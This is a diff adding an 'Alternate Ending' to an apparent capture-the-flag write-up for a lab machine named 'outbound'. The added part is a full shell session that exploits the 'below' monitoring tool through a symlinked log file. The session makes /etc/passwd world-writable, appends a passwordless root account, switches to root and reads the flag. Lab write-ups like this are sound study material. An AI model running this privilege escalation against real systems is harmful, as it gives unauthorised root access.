@@ -510,3 +510,56 @@ print(root_outbound.exec("cat /root/.ssh/authorized_keys | grep -C 3 ed25519"))
 
 
 You can see, that even with all the garbage, ssh will eventually try the line with the ssh-ed25519, and with its default context anything that comes after the key itself is simply metadata for use in other components that don't matter to auth. 
+
+## Alternate Ending
+After talking with another cohort, I learned how they actually exploited the CVE which is definitely the intended solution.
+
+```sh
+jacob@outbound:~$ cd /var/log/below
+jacob@outbound:/var/log/below$ ls
+error_jacob.log  error_root.log  store
+# Clean up the folder and identify our target. /etc/shadow is mounted RO or chattr +i so we cannot write to it.
+jacob@outbound:/var/log/below$ rm error_root.log 
+jacob@outbound:/var/log/below$ stat /etc/passwd
+  File: /etc/passwd
+  Size: 1840            Blocks: 8          IO Block: 4096   regular file
+Device: 8,2     Inode: 16522       Links: 1
+Access: (0644/-rw-r--r--)  Uid: (    0/    root)   Gid: (    0/    root)
+Access: 2025-07-15 23:39:51.539000236 +0000
+Modify: 2025-07-08 21:06:21.791868493 +0000
+Change: 2025-07-08 21:06:21.793868494 +0000
+ Birth: 2025-07-08 21:06:21.791868493 +0000
+# When we create the link, the app will traverse it to chmod the target file.
+jacob@outbound:/var/log/below$ ln -s /etc/passwd error_root.log
+jacob@outbound:/var/log/below$ sudo below record
+Jul 15 23:42:48.623 DEBG Starting up!
+Jul 15 23:42:48.623 ERRO 
+----------------- Detected unclean exit ---------------------
+Error Message: Failed to acquire file lock on index file: /var/log/below/store/index_01752537600: EAGAIN: Try again
+-------------------------------------------------------------
+# Now we can see the actual file itself is modified.
+jacob@outbound:/var/log/below$ stat /etc/passwd
+  File: /etc/passwd
+  Size: 1840            Blocks: 8          IO Block: 4096   regular file
+Device: 8,2     Inode: 16522       Links: 1
+Access: (0666/-rw-rw-rw-)  Uid: (    0/    root)   Gid: (    0/    root)
+Access: 2025-07-15 23:39:51.539000236 +0000
+Modify: 2025-07-08 21:06:21.791868493 +0000
+Change: 2025-07-15 23:42:48.621561217 +0000
+ Birth: 2025-07-08 21:06:21.791868493 +0000
+# So we can easily add ourselves as the root uuid/guid
+jacob@outbound:/var/log/below$ echo "tokugero::0:0:tokugero:/root:/bin/bash" >> /etc/passwd
+jacob@outbound:/var/log/below$ cat /etc/passwd | tail -n 5
+_laurel:x:999:988::/var/log/laurel:/bin/false
+mel:x:1000:1000:,,,:/home/mel:/bin/bash
+tyler:x:1001:1001:,,,:/home/tyler:/bin/bash
+jacob:x:1002:1002:,,,:/home/jacob:/bin/bash
+tokugero::0:0:tokugero:/root:/bin/bash
+# And just shimmy over!
+jacob@outbound:/var/log/below$ su tokugero
+root@outbound:/var/log/below# whoami
+root
+root@outbound:/var/log/below# cd /root/
+root@outbound:~# cat root.txt
+447233d69b2cc88c5cf7fc77444c87c4
+```
